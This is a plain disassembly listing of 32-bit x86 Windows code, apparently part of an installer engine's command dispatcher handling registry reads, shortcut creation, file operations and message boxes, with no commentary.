  401db4:	e9 0c 0d 00 00       	jmp    0x402ac5
  401db9:	ff 75 f8             	push   -0x8(%ebp)
  401dbc:	ff 15 54 82 40 00    	call   *0x408254
  401dc2:	6a 02                	push   $0x2
  401dc4:	8b f8                	mov    %eax,%edi
  401dc6:	e8 54 0e 00 00       	call   0x402c1f
  401dcb:	59                   	pop    %ecx
  401dcc:	8b d8                	mov    %eax,%ebx
  401dce:	6a 48                	push   $0x48
  401dd0:	6a 5a                	push   $0x5a
  401dd2:	57                   	push   %edi
  401dd3:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401dd6:	ff 15 60 80 40 00    	call   *0x408060
  401ddc:	50                   	push   %eax
  401ddd:	53                   	push   %ebx
  401dde:	ff 15 54 81 40 00    	call   *0x408154
  401de4:	57                   	push   %edi
  401de5:	ff 75 f8             	push   -0x8(%ebp)
  401de8:	f7 d8                	neg    %eax
  401dea:	a3 d0 e5 41 00       	mov    %eax,0x41e5d0
  401def:	ff 15 0c 82 40 00    	call   *0x40820c
  401df5:	6a 03                	push   $0x3
  401df7:	e8 23 0e 00 00       	call   0x402c1f
  401dfc:	a3 e0 e5 41 00       	mov    %eax,0x41e5e0
  401e01:	8a 45 e8             	mov    -0x18(%ebp),%al
  401e04:	59                   	pop    %ecx
  401e05:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401e08:	ff 75 dc             	push   -0x24(%ebp)
  401e0b:	8a c8                	mov    %al,%cl
  401e0d:	80 e1 01             	and    $0x1,%cl
  401e10:	c6 05 e7 e5 41 00 01 	movb   $0x1,0x41e5e7
  401e17:	88 0d e4 e5 41 00    	mov    %cl,0x41e5e4
  401e1d:	8a c8                	mov    %al,%cl
  401e1f:	80 e1 02             	and    $0x2,%cl
  401e22:	24 04                	and    $0x4,%al
  401e24:	68 ec e5 41 00       	push   $0x41e5ec
  401e29:	88 0d e5 e5 41 00    	mov    %cl,0x41e5e5
  401e2f:	a2 e6 e5 41 00       	mov    %al,0x41e5e6
  401e34:	e8 a3 44 00 00       	call   0x4062dc
  401e39:	68 d0 e5 41 00       	push   $0x41e5d0
  401e3e:	ff 15 54 80 40 00    	call   *0x408054
  401e44:	e9 49 07 00 00       	jmp    0x402592
  401e49:	53                   	push   %ebx
  401e4a:	e8 d0 0d 00 00       	call   0x402c1f
  401e4f:	6a 01                	push   $0x1
  401e51:	8b f0                	mov    %eax,%esi
  401e53:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401e56:	e8 c4 0d 00 00       	call   0x402c1f
  401e5b:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401e5e:	59                   	pop    %ecx
  401e5f:	59                   	pop    %ecx
  401e60:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401e63:	50                   	push   %eax
  401e64:	56                   	push   %esi
  401e65:	75 0b                	jne    0x401e72
  401e67:	ff 15 68 82 40 00    	call   *0x408268
  401e6d:	e9 53 0c 00 00       	jmp    0x402ac5
  401e72:	ff 15 10 82 40 00    	call   *0x408210
  401e78:	e9 48 0c 00 00       	jmp    0x402ac5
  401e7d:	53                   	push   %ebx
  401e7e:	e8 be 0d 00 00       	call   0x402c41
  401e83:	6a 31                	push   $0x31
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 b5 0d 00 00       	call   0x402c41
  401e8c:	6a 22                	push   $0x22
  401e8e:	8b d8                	mov    %eax,%ebx
  401e90:	e8 ac 0d 00 00       	call   0x402c41
  401e95:	6a 15                	push   $0x15
  401e97:	8b f8                	mov    %eax,%edi
  401e99:	e8 a3 0d 00 00       	call   0x402c41
  401e9e:	6a ec                	push   $0xffffffec
  401ea0:	e8 7e f5 ff ff       	call   0x401423
  401ea5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ea8:	89 45 80             	mov    %eax,-0x80(%ebp)
  401eab:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401eae:	89 45 84             	mov    %eax,-0x7c(%ebp)
  401eb1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401eb4:	89 45 98             	mov    %eax,-0x68(%ebp)
  401eb7:	66 8b 06             	mov    (%esi),%ax
  401eba:	66 f7 d8             	neg    %ax
  401ebd:	1b c0                	sbb    %eax,%eax
  401ebf:	89 5d 8c             	mov    %ebx,-0x74(%ebp)
  401ec2:	23 c6                	and    %esi,%eax
  401ec4:	89 45 88             	mov    %eax,-0x78(%ebp)
  401ec7:	66 8b 07             	mov    (%edi),%ax
  401eca:	66 f7 d8             	neg    %ax
  401ecd:	1b c0                	sbb    %eax,%eax
  401ecf:	c7 45 94 00 30 4d 00 	movl   $0x4d3000,-0x6c(%ebp)
  401ed6:	23 c7                	and    %edi,%eax
  401ed8:	89 45 90             	mov    %eax,-0x70(%ebp)
  401edb:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401ee1:	50                   	push   %eax
  401ee2:	e8 ff 39 00 00       	call   0x4058e6
  401ee7:	85 c0                	test   %eax,%eax
  401ee9:	0f 84 9c 09 00 00    	je     0x40288b
  401eef:	f6 45 80 40          	testb  $0x40,-0x80(%ebp)
  401ef3:	0f 84 cc 0b 00 00    	je     0x402ac5
  401ef9:	ff 75 b4             	push   -0x4c(%ebp)
  401efc:	e8 44 48 00 00       	call   0x406745
  401f01:	ff 75 b4             	push   -0x4c(%ebp)
  401f04:	eb 47                	jmp    0x401f4d
  401f06:	53                   	push   %ebx
  401f07:	e8 35 0d 00 00       	call   0x402c41
  401f0c:	8b f0                	mov    %eax,%esi
  401f0e:	56                   	push   %esi
  401f0f:	6a eb                	push   $0xffffffeb
  401f11:	e8 0c 34 00 00       	call   0x405322
  401f16:	56                   	push   %esi
  401f17:	e8 87 39 00 00       	call   0x4058a3
  401f1c:	8b f0                	mov    %eax,%esi
  401f1e:	3b f3                	cmp    %ebx,%esi
  401f20:	0f 84 65 09 00 00    	je     0x40288b
  401f26:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401f29:	74 21                	je     0x401f4c
  401f2b:	56                   	push   %esi
  401f2c:	e8 14 48 00 00       	call   0x406745
  401f31:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f34:	7c 0b                	jl     0x401f41
  401f36:	50                   	push   %eax
  401f37:	ff 75 f4             	push   -0xc(%ebp)
  401f3a:	e8 c2 42 00 00       	call   0x406201
  401f3f:	eb 0b                	jmp    0x401f4c
  401f41:	3b c3                	cmp    %ebx,%eax
  401f43:	74 07                	je     0x401f4c
  401f45:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f4c:	56                   	push   %esi
  401f4d:	ff 15 20 81 40 00    	call   *0x408120
  401f53:	e9 6d 0b 00 00       	jmp    0x402ac5
  401f58:	6a 02                	push   $0x2
  401f5a:	e8 e2 0c 00 00       	call   0x402c41
  401f5f:	50                   	push   %eax
  401f60:	e8 98 46 00 00       	call   0x4065fd
  401f65:	8b f8                	mov    %eax,%edi
  401f67:	3b fb                	cmp    %ebx,%edi
  401f69:	74 13                	je     0x401f7e
  401f6b:	ff 77 14             	push   0x14(%edi)
  401f6e:	ff 75 f4             	push   -0xc(%ebp)
  401f71:	e8 8b 42 00 00       	call   0x406201
  401f76:	ff 77 18             	push   0x18(%edi)
  401f79:	e9 ef f5 ff ff       	jmp    0x40156d
  401f7e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401f81:	66 89 1e             	mov    %bx,(%esi)
  401f84:	66 89 18             	mov    %bx,(%eax)
  401f87:	e9 ff 08 00 00       	jmp    0x40288b
  401f8c:	6a ee                	push   $0xffffffee
  401f8e:	e8 ae 0c 00 00       	call   0x402c41
  401f93:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  401f96:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401f99:	51                   	push   %ecx
  401f9a:	50                   	push   %eax
  401f9b:	6a 09                	push   $0x9
  401f9d:	e8 f2 46 00 00       	call   0x406694
  401fa2:	ff d0                	call   *%eax
  401fa4:	8b f8                	mov    %eax,%edi
  401fa6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401fa9:	66 89 1e             	mov    %bx,(%esi)
  401fac:	3b fb                	cmp    %ebx,%edi
  401fae:	66 89 18             	mov    %bx,(%eax)
  401fb1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fb8:	0f 84 07 0b 00 00    	je     0x402ac5
  401fbe:	57                   	push   %edi
  401fbf:	6a 40                	push   $0x40
  401fc1:	ff 15 34 81 40 00    	call   *0x408134
  401fc7:	3b c3                	cmp    %ebx,%eax
  401fc9:	89 45 08             	mov    %eax,0x8(%ebp)
  401fcc:	0f 84 f3 0a 00 00    	je     0x402ac5
  401fd2:	6a 0a                	push   $0xa
  401fd4:	e8 bb 46 00 00       	call   0x406694
  401fd9:	6a 0b                	push   $0xb
  401fdb:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401fde:	e8 b1 46 00 00       	call   0x406694
  401fe3:	ff 75 08             	push   0x8(%ebp)
  401fe6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401fe9:	57                   	push   %edi
  401fea:	53                   	push   %ebx
  401feb:	ff 75 d0             	push   -0x30(%ebp)
  401fee:	ff 55 c8             	call   *-0x38(%ebp)
  401ff1:	85 c0                	test   %eax,%eax
  401ff3:	74 34                	je     0x402029
  401ff5:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401ff8:	50                   	push   %eax
  401ff9:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401ffc:	50                   	push   %eax
  401ffd:	68 14 a0 40 00       	push   $0x40a014
  402002:	ff 75 08             	push   0x8(%ebp)
  402005:	ff 55 f0             	call   *-0x10(%ebp)
  402008:	85 c0                	test   %eax,%eax
  40200a:	74 1d                	je     0x402029
  40200c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40200f:	ff 70 08             	push   0x8(%eax)
  402012:	56                   	push   %esi
  402013:	e8 e9 41 00 00       	call   0x406201
  402018:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40201b:	ff 70 0c             	push   0xc(%eax)
  40201e:	ff 75 f4             	push   -0xc(%ebp)
  402021:	e8 db 41 00 00       	call   0x406201
  402026:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402029:	ff 75 08             	push   0x8(%ebp)
  40202c:	e9 b6 fb ff ff       	jmp    0x401be7
  402031:	39 1d b8 af 47 00    	cmp    %ebx,0x47afb8
  402037:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40203e:	0f 8c b9 00 00 00    	jl     0x4020fd
  402044:	6a f0                	push   $0xfffffff0
  402046:	e8 f6 0b 00 00       	call   0x402c41
  40204b:	6a 01                	push   $0x1
  40204d:	8b f0                	mov    %eax,%esi
  40204f:	e8 ed 0b 00 00       	call   0x402c41
  402054:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402057:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40205a:	74 0e                	je     0x40206a
  40205c:	56                   	push   %esi
  40205d:	ff 15 70 81 40 00    	call   *0x408170
  402063:	3b c3                	cmp    %ebx,%eax
  402065:	89 45 08             	mov    %eax,0x8(%ebp)
  402068:	75 11                	jne    0x40207b
  40206a:	6a 08                	push   $0x8
  40206c:	53                   	push   %ebx
  40206d:	56                   	push   %esi
  40206e:	ff 15 6c 81 40 00    	call   *0x40816c
  402074:	3b c3                	cmp    %ebx,%eax
  402076:	89 45 08             	mov    %eax,0x8(%ebp)
  402079:	74 7b                	je     0x4020f6
  40207b:	ff 75 c4             	push   -0x3c(%ebp)
  40207e:	ff 75 08             	push   0x8(%ebp)
  402081:	e8 7d 46 00 00       	call   0x406703
  402086:	8b f0                	mov    %eax,%esi
  402088:	3b f3                	cmp    %ebx,%esi
  40208a:	74 39                	je     0x4020c5
  40208c:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40208f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402092:	74 17                	je     0x4020ab
  402094:	ff 75 e0             	push   -0x20(%ebp)
  402097:	e8 87 f3 ff ff       	call   0x401423
  40209c:	ff d6                	call   *%esi
  40209e:	85 c0                	test   %eax,%eax
  4020a0:	74 2d                	je     0x4020cf
  4020a2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020a9:	eb 24                	jmp    0x4020cf
  4020ab:	68 00 a0 40 00       	push   $0x40a000
  4020b0:	68 30 e6 41 00       	push   $0x41e630
  4020b5:	57                   	push   %edi
  4020b6:	68 00 20 00 00       	push   $0x2000
  4020bb:	ff 75 f8             	push   -0x8(%ebp)
  4020be:	ff d6                	call   *%esi
  4020c0:	83 c4 14             	add    $0x14,%esp
  4020c3:	eb 0a                	jmp    0x4020cf
  4020c5:	ff 75 c4             	push   -0x3c(%ebp)
  4020c8:	6a f7                	push   $0xfffffff7
  4020ca:	e8 53 32 00 00       	call   0x405322
  4020cf:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4020d2:	0f 85 ed 09 00 00    	jne    0x402ac5
  4020d8:	ff 75 08             	push   0x8(%ebp)
  4020db:	e8 6a 18 00 00       	call   0x40394a
  4020e0:	85 c0                	test   %eax,%eax
  4020e2:	0f 84 dd 09 00 00    	je     0x402ac5
  4020e8:	ff 75 08             	push   0x8(%ebp)
  4020eb:	ff 15 68 81 40 00    	call   *0x408168
  4020f1:	e9 cf 09 00 00       	jmp    0x402ac5
  4020f6:	6a f6                	push   $0xfffffff6
  4020f8:	e9 4e 01 00 00       	jmp    0x40224b
  4020fd:	6a e7                	push   $0xffffffe7
  4020ff:	e9 47 01 00 00       	jmp    0x40224b
  402104:	6a f0                	push   $0xfffffff0
  402106:	e8 36 0b 00 00       	call   0x402c41
  40210b:	6a df                	push   $0xffffffdf
  40210d:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402110:	e8 2c 0b 00 00       	call   0x402c41
  402115:	6a 02                	push   $0x2
  402117:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40211a:	e8 22 0b 00 00       	call   0x402c41
  40211f:	6a cd                	push   $0xffffffcd
  402121:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402124:	e8 18 0b 00 00       	call   0x402c41
  402129:	6a 45                	push   $0x45
  40212b:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40212e:	e8 0e 0b 00 00       	call   0x402c41
  402133:	ff 75 c4             	push   -0x3c(%ebp)
  402136:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402139:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40213c:	8b c8                	mov    %eax,%ecx
  40213e:	8b f8                	mov    %eax,%edi
  402140:	8b f0                	mov    %eax,%esi
  402142:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  402148:	c1 f8 10             	sar    $0x10,%eax
  40214b:	c1 fe 0c             	sar    $0xc,%esi
  40214e:	25 ff ff 00 00       	and    $0xffff,%eax
  402153:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402156:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40215c:	83 e6 07             	and    $0x7,%esi
  40215f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402162:	e8 9f 3a 00 00       	call   0x405c06
  402167:	85 c0                	test   %eax,%eax
  402169:	75 07                	jne    0x402172
  40216b:	6a 21                	push   $0x21
  40216d:	e8 cf 0a 00 00       	call   0x402c41
  402172:	8d 45 08             	lea    0x8(%ebp),%eax
  402175:	50                   	push   %eax
  402176:	68 e0 85 40 00       	push   $0x4085e0
  40217b:	6a 01                	push   $0x1
  40217d:	53                   	push   %ebx
  40217e:	68 f0 85 40 00       	push   $0x4085f0
  402183:	ff 15 a8 82 40 00    	call   *0x4082a8
  402189:	3b c3                	cmp    %ebx,%eax
  40218b:	0f 8c b1 00 00 00    	jl     0x402242
  402191:	8b 45 08             	mov    0x8(%ebp),%eax
  402194:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402197:	52                   	push   %edx
  402198:	68 00 86 40 00       	push   $0x408600
  40219d:	8b 08                	mov    (%eax),%ecx
  40219f:	50                   	push   %eax
  4021a0:	ff 11                	call   *(%ecx)
  4021a2:	3b c3                	cmp    %ebx,%eax
  4021a4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021a7:	0f 8c 87 00 00 00    	jl     0x402234
  4021ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4021b0:	ff 75 c4             	push   -0x3c(%ebp)
  4021b3:	8b 08                	mov    (%eax),%ecx
  4021b5:	50                   	push   %eax
  4021b6:	ff 51 50             	call   *0x50(%ecx)
  4021b9:	3b fb                	cmp    %ebx,%edi
  4021bb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021be:	75 0e                	jne    0x4021ce
  4021c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c3:	68 00 30 4d 00       	push   $0x4d3000
  4021c8:	50                   	push   %eax
  4021c9:	8b 08                	mov    (%eax),%ecx
  4021cb:	ff 51 24             	call   *0x24(%ecx)
  4021ce:	3b f3                	cmp    %ebx,%esi
  4021d0:	74 0a                	je     0x4021dc
  4021d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4021d5:	56                   	push   %esi
  4021d6:	50                   	push   %eax
  4021d7:	8b 08                	mov    (%eax),%ecx
  4021d9:	ff 51 3c             	call   *0x3c(%ecx)
  4021dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4021df:	ff 75 c8             	push   -0x38(%ebp)
  4021e2:	8b 08                	mov    (%eax),%ecx
  4021e4:	50                   	push   %eax
  4021e5:	ff 51 34             	call   *0x34(%ecx)
  4021e8:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4021eb:	66 39 19             	cmp    %bx,(%ecx)
  4021ee:	74 0d                	je     0x4021fd
  4021f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4021f3:	ff 75 bc             	push   -0x44(%ebp)
  4021f6:	8b 10                	mov    (%eax),%edx
  4021f8:	51                   	push   %ecx
  4021f9:	50                   	push   %eax
  4021fa:	ff 52 44             	call   *0x44(%edx)
  4021fd:	8b 45 08             	mov    0x8(%ebp),%eax
  402200:	ff 75 f8             	push   -0x8(%ebp)
  402203:	8b 08                	mov    (%eax),%ecx
  402205:	50                   	push   %eax
  402206:	ff 51 2c             	call   *0x2c(%ecx)
  402209:	8b 45 08             	mov    0x8(%ebp),%eax
  40220c:	ff 75 f4             	push   -0xc(%ebp)
  40220f:	8b 08                	mov    (%eax),%ecx
  402211:	50                   	push   %eax
  402212:	ff 51 1c             	call   *0x1c(%ecx)
  402215:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  402218:	7c 11                	jl     0x40222b
  40221a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40221d:	6a 01                	push   $0x1
  40221f:	ff 75 b4             	push   -0x4c(%ebp)
  402222:	8b 08                	mov    (%eax),%ecx
  402224:	50                   	push   %eax
  402225:	ff 51 18             	call   *0x18(%ecx)
  402228:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40222b:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40222e:	50                   	push   %eax
  40222f:	8b 08                	mov    (%eax),%ecx
  402231:	ff 51 08             	call   *0x8(%ecx)
  402234:	8b 45 08             	mov    0x8(%ebp),%eax
  402237:	50                   	push   %eax
  402238:	8b 08                	mov    (%eax),%ecx
  40223a:	ff 51 08             	call   *0x8(%ecx)
  40223d:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  402240:	7d 13                	jge    0x402255
  402242:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402249:	6a f0                	push   $0xfffffff0
  40224b:	e8 d3 f1 ff ff       	call   0x401423
  402250:	e9 70 08 00 00       	jmp    0x402ac5
  402255:	6a f4                	push   $0xfffffff4
  402257:	eb f2                	jmp    0x40224b
  402259:	53                   	push   %ebx
  40225a:	e8 e2 09 00 00       	call   0x402c41
  40225f:	6a 11                	push   $0x11
  402261:	8b f0                	mov    %eax,%esi
  402263:	e8 d9 09 00 00       	call   0x402c41
  402268:	6a 23                	push   $0x23
  40226a:	8b f8                	mov    %eax,%edi
  40226c:	e8 d0 09 00 00       	call   0x402c41
  402271:	56                   	push   %esi
  402272:	89 45 08             	mov    %eax,0x8(%ebp)
  402275:	e8 83 43 00 00       	call   0x4065fd
  40227a:	85 c0                	test   %eax,%eax
  40227c:	75 0d                	jne    0x40228b
  40227e:	53                   	push   %ebx
  40227f:	6a f9                	push   $0xfffffff9
  402281:	e8 9c 30 00 00       	call   0x405322
  402286:	e9 00 06 00 00       	jmp    0x40288b
  40228b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40228e:	56                   	push   %esi
  40228f:	89 45 98             	mov    %eax,-0x68(%ebp)
  402292:	c7 45 9c 02 00 00 00 	movl   $0x2,-0x64(%ebp)
  402299:	e8 32 40 00 00       	call   0x4062d0
  40229e:	57                   	push   %edi
  40229f:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  4022a4:	e8 27 40 00 00       	call   0x4062d0
  4022a9:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	66 8b 4d e0          	mov    -0x20(%ebp),%cx
  4022b5:	50                   	push   %eax
  4022b6:	53                   	push   %ebx
  4022b7:	89 75 a0             	mov    %esi,-0x60(%ebp)
  4022ba:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  4022bd:	89 45 b2             	mov    %eax,-0x4e(%ebp)
  4022c0:	66 89 4d a8          	mov    %cx,-0x58(%ebp)
  4022c4:	e8 59 30 00 00       	call   0x405322
  4022c9:	8d 45 98             	lea    -0x68(%ebp),%eax
  4022cc:	50                   	push   %eax
  4022cd:	ff 15 8c 81 40 00    	call   *0x40818c
  4022d3:	85 c0                	test   %eax,%eax
  4022d5:	0f 84 ea 07 00 00    	je     0x402ac5
  4022db:	eb a1                	jmp    0x40227e
  4022dd:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4022e2:	74 1d                	je     0x402301
  4022e4:	68 10 00 20 00       	push   $0x200010
  4022e9:	6a e8                	push   $0xffffffe8
  4022eb:	53                   	push   %ebx
  4022ec:	e8 eb 3f 00 00       	call   0x4062dc
  4022f1:	50                   	push   %eax
  4022f2:	e8 29 36 00 00       	call   0x405920
  4022f7:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4022fc:	e9 cf 07 00 00       	jmp    0x402ad0
  402301:	ff 05 94 af 47 00    	incl   0x47af94
  402307:	e9 b9 07 00 00       	jmp    0x402ac5
  40230c:	33 f6                	xor    %esi,%esi
  40230e:	33 ff                	xor    %edi,%edi
  402310:	3b c3                	cmp    %ebx,%eax
  402312:	74 08                	je     0x40231c
  402314:	53                   	push   %ebx
  402315:	e8 27 09 00 00       	call   0x402c41
  40231a:	8b f0                	mov    %eax,%esi
  40231c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40231f:	74 09                	je     0x40232a
  402321:	6a 11                	push   $0x11
  402323:	e8 19 09 00 00       	call   0x402c41
  402328:	8b f8                	mov    %eax,%edi
  40232a:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  40232d:	74 09                	je     0x402338
  40232f:	6a 22                	push   $0x22
  402331:	e8 0b 09 00 00       	call   0x402c41
  402336:	8b d8                	mov    %eax,%ebx
  402338:	6a cd                	push   $0xffffffcd
  40233a:	e8 02 09 00 00       	call   0x402c41
  40233f:	50                   	push   %eax
  402340:	53                   	push   %ebx
  402341:	57                   	push   %edi
  402342:	56                   	push   %esi
  402343:	ff 15 64 81 40 00    	call   *0x408164
  402349:	e9 66 f2 ff ff       	jmp    0x4015b4
  40234e:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402353:	6a 01                	push   $0x1
  402355:	89 45 08             	mov    %eax,0x8(%ebp)
  402358:	e8 e4 08 00 00       	call   0x402c41
  40235d:	6a 12                	push   $0x12
  40235f:	8b f8                	mov    %eax,%edi
  402361:	e8 db 08 00 00       	call   0x402c41
  402366:	6a dd                	push   $0xffffffdd
  402368:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40236b:	e8 d1 08 00 00       	call   0x402c41
  402370:	50                   	push   %eax
  402371:	68 ff 1f 00 00       	push   $0x1fff
  402376:	8d 45 08             	lea    0x8(%ebp),%eax
  402379:	56                   	push   %esi
  40237a:	50                   	push   %eax
  40237b:	ff 75 b4             	push   -0x4c(%ebp)
  40237e:	57                   	push   %edi
  40237f:	ff 15 60 81 40 00    	call   *0x408160
  402385:	66 83 3e 0a          	cmpw   $0xa,(%esi)
  402389:	e9 c3 f3 ff ff       	jmp    0x401751
  40238e:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402391:	8b 75 dc             	mov    -0x24(%ebp),%esi
  402394:	75 2b                	jne    0x4023c1
  402396:	6a 02                	push   $0x2
  402398:	e8 e4 08 00 00       	call   0x402c81
  40239d:	8b f0                	mov    %eax,%esi
  40239f:	3b f3                	cmp    %ebx,%esi
  4023a1:	0f 84 e4 04 00 00    	je     0x40288b
  4023a7:	6a 33                	push   $0x33
  4023a9:	e8 93 08 00 00       	call   0x402c41
  4023ae:	50                   	push   %eax
  4023af:	56                   	push   %esi
  4023b0:	ff 15 20 80 40 00    	call   *0x408020
  4023b6:	56                   	push   %esi
  4023b7:	8b f8                	mov    %eax,%edi
  4023b9:	ff 15 24 80 40 00    	call   *0x408024
  4023bf:	eb 16                	jmp    0x4023d7
  4023c1:	6a 22                	push   $0x22
  4023c3:	e8 79 08 00 00       	call   0x402c41
  4023c8:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4023cb:	d1 f9                	sar    $1,%ecx
  4023cd:	51                   	push   %ecx
  4023ce:	50                   	push   %eax
  4023cf:	56                   	push   %esi
  4023d0:	e8 2a 09 00 00       	call   0x402cff
  4023d5:	8b f8                	mov    %eax,%edi
  4023d7:	3b fb                	cmp    %ebx,%edi
  4023d9:	0f 84 e6 06 00 00    	je     0x402ac5
  4023df:	e9 a7 04 00 00       	jmp    0x40288b
  4023e4:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4023e7:	8b f8                	mov    %eax,%edi
  4023e9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4023ec:	6a 02                	push   $0x2
  4023ee:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4023f1:	e8 4b 08 00 00       	call   0x402c41
  4023f6:	6a 11                	push   $0x11
  4023f8:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4023fb:	e8 41 08 00 00       	call   0x402c41
  402400:	6a 02                	push   $0x2
  402402:	50                   	push   %eax
  402403:	57                   	push   %edi
  402404:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40240b:	e8 c1 08 00 00       	call   0x402cd1
  402410:	3b c3                	cmp    %ebx,%eax
  402412:	89 45 08             	mov    %eax,0x8(%ebp)
  402415:	0f 84 aa 06 00 00    	je     0x402ac5
  40241b:	33 c0                	xor    %eax,%eax
  40241d:	83 fe 01             	cmp    $0x1,%esi
  402420:	bf d0 25 41 00       	mov    $0x4125d0,%edi
  402425:	75 11                	jne    0x402438
  402427:	6a 23                	push   $0x23
  402429:	e8 13 08 00 00       	call   0x402c41
  40242e:	57                   	push   %edi
  40242f:	e8 9c 3e 00 00       	call   0x4062d0
  402434:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  402438:	83 fe 04             	cmp    $0x4,%esi
  40243b:	75 12                	jne    0x40244f
  40243d:	6a 03                	push   $0x3
  40243f:	e8 db 07 00 00       	call   0x402c1f
  402444:	59                   	pop    %ecx
  402445:	a3 d0 25 41 00       	mov    %eax,0x4125d0
  40244a:	56                   	push   %esi
  40244b:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40244e:	58                   	pop    %eax
  40244f:	83 fe 03             	cmp    $0x3,%esi
  402452:	75 0f                	jne    0x402463
  402454:	68 00 c0 00 00       	push   $0xc000
  402459:	57                   	push   %edi
  40245a:	53                   	push   %ebx
  40245b:	ff 75 e4             	push   -0x1c(%ebp)
  40245e:	e8 b3 0c 00 00       	call   0x403116
  402463:	50                   	push   %eax
  402464:	57                   	push   %edi
  402465:	ff 75 b4             	push   -0x4c(%ebp)
  402468:	53                   	push   %ebx
  402469:	ff 75 c4             	push   -0x3c(%ebp)
  40246c:	ff 75 08             	push   0x8(%ebp)
  40246f:	ff 15 28 80 40 00    	call   *0x408028
  402475:	85 c0                	test   %eax,%eax
  402477:	75 03                	jne    0x40247c
  402479:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40247c:	ff 75 08             	push   0x8(%ebp)
  40247f:	e9 d3 00 00 00       	jmp    0x402557
  402484:	68 19 00 02 00       	push   $0x20019
  402489:	e8 f3 07 00 00       	call   0x402c81
  40248e:	6a 33                	push   $0x33
  402490:	8b f8                	mov    %eax,%edi
  402492:	e8 aa 07 00 00       	call   0x402c41
  402497:	3b fb                	cmp    %ebx,%edi
  402499:	66 89 1e             	mov    %bx,(%esi)
  40249c:	0f 84 e9 03 00 00    	je     0x40288b
  4024a2:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4024a5:	c7 45 b4 00 40 00 00 	movl   $0x4000,-0x4c(%ebp)
  4024ac:	51                   	push   %ecx
  4024ad:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024b0:	56                   	push   %esi
  4024b1:	51                   	push   %ecx
  4024b2:	53                   	push   %ebx
  4024b3:	50                   	push   %eax
  4024b4:	57                   	push   %edi
  4024b5:	ff 15 2c 80 40 00    	call   *0x40802c
  4024bb:	33 c9                	xor    %ecx,%ecx
  4024bd:	41                   	inc    %ecx
  4024be:	85 c0                	test   %eax,%eax
  4024c0:	75 2e                	jne    0x4024f0
